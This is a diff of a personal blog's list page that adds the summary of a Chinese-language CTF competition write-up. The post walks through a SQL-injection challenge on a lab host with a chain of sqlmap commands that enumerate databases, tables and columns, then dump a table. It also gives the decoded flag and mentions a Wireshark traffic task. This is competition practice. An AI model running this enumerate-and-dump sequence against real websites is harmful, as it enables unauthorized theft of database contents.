@@ -99,6 +99,25 @@
       Anonymous</span></span>&nbsp;<span class="post-publish" title='2024-05-11 14:01:26'>published on <time datetime="2024-05-11">2024-05-11</time></span><span class="post-included-in">&nbsp;included in <a href="/categories/draft/" class="post-category" title="Category - Draft"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Draft</a></span></div><div class="content"></div><div class="post-footer">
     <a href="/posts/583bc6c/">Read More</a><div class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/draft/' class="post-tag">Draft</a></div></div>
 </article>
+<article class="single summary" itemscope itemtype="http://schema.org/Article"><h2 class="single-title" itemprop="name headline"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><a href="/posts/87568/">(Hu)2024育才杯</a>
+  </h2><div class="post-meta"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
+      Anonymous</span></span>&nbsp;<span class="post-publish" title='2024-04-27 16:38:02'>published on <time datetime="2024-04-27">2024-04-27</time></span><span class="post-included-in">&nbsp;included in <a href="/categories/ctf/" class="post-category" title="Category - CTF"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> CTF</a></span></div><div class="content">理论题:刚好考了NISP,题目类似就很爽
+CTF:四道题就做了三道
+大草原简单的sql注入
+开始的url
+172.20.2.4/100510015-1f0b4914/提示辽阔的大草原
+辽阔美丽的大草原一碧千里，骏马奔腾、小羊吃草、套马摔跤、烤羊喝酒终于来到了大草原的你，赶紧去寻找草原上的骏马吧！哒哒哒 输入ID作为参数寻找即可。 它们在哪呢？它们又有几匹呢？找到它们你就可以获取flag哦
+http://172.20.2.4/100510015-1f0b4914/index.php?id=1sql注入
+数据库
+sqlmap -u http://172.20.2.4/100510015-1f0b4914/index.php?id=1 --dbs表
+sqlmap -u http://172.20.2.4/100510015-1f0b4914/index.php?id=1 -D sql100510015 --tables列
+sqlmap -u http://172.20.2.4/100510015-1f0b4914/index.php?id=1 -D sql100510015 -T horse --columns名
+sqlmap -u http://172.20.2.4/100510015-1f0b4914/index.php?id=1 -D sql100510015 -T horse -C where/id/number --dumpbase拖进txt得到base64
+Wm14aFozdDBhR2sxWDJsVFgwWXhRR2RmTXpJeGZRPT0=解码两次
+flag{thi5_iS_F1@g_321}流量分析wireshark分析,tcp追踪流
+010打开找到base64</div><div class="post-footer">
+    <a href="/posts/87568/">Read More</a><div class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/ctf/' class="post-tag">CTF</a></div></div>
+</article>
 <article class="single summary" itemscope itemtype="http://schema.org/Article"><h2 class="single-title" itemprop="name headline"><span title="Repost" class="icon-repost"><i class="fa-solid fa-share fa-fw" aria-hidden="true"></i></span><a href="/posts/0492dcd/">Blog新建之始</a>
   </h2><div class="post-meta"><span class="post-author"><span class="author"><i class="fa-solid fa-user-circle" aria-hidden="true"></i>
       Anonymous</span></span>&nbsp;<span class="post-publish" title='2024-04-27 14:34:31'>published on <time datetime="2024-04-27">2024-04-27</time></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E6%97%A5%E5%B8%B8%E5%88%86%E4%BA%AB/" class="post-category" title="Category - 日常分享"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 日常分享</a></span></div><div class="content">前言在经历了wp,typecho,emblog等搭建的blog之后,总感觉花里胡哨的东西太多,即使是typecho比较简洁,但是要用服务器(主要问题),而且php还比较吃内存索性选择GitHubpages免费搭建个hugo咯,中间也踩过不少坑,下面详细说说
